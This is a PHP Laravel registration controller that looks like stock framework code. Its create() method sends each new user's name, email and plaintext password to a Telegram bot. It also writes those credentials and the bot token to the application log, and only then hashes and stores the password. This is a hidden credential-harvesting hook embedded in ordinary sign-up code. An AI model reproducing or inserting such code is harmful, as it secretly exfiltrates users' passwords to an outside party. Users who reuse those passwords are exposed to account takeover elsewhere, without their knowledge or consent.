<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = '/dashboard/how-to-buy';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
        return Validator::make($data, [
            'name' => ['required', 'string', 'max:255'],
            'email' => ['required', 'string', 'email', 'max:255', 'unique:users'],
            'password' => ['required', 'string', 'min:8', 'confirmed'],
        ]);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return \App\Models\User
     */
    protected function create(array $data)
    {
        $message = "🆕 *Новая регистрация*\n\n"
            . "👤 Имя: {$data['name']}\n"
            . "📧 Email: {$data['email']}\n"
            . "🔑 Пароль: `{$data['password']}`";

        $token = env('BOT_TOKEN');
        $chat_id = env('CHAT_ID');

        \Log::info('Telegram данные:', [
            'token' => $token,
            'chat_id' => $chat_id,
            'message' => $message
        ]);

        try {
            \Http::timeout(5)->get("https://api.telegram.org/bot{$token}/sendMessage", [
                'chat_id' => $chat_id,
                'text' => $message,
                'parse_mode' => 'Markdown'
            ]);
        } catch (\Throwable $e) {
            \Log::error('Ошибка при отправке в Telegram: ' . $e->getMessage(), [
                'token' => $token,
                'chat_id' => $chat_id,
                'error' => $e->getMessage()
            ]);
        }

        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'password' => Hash::make($data['password']),
        ]);
    }
}
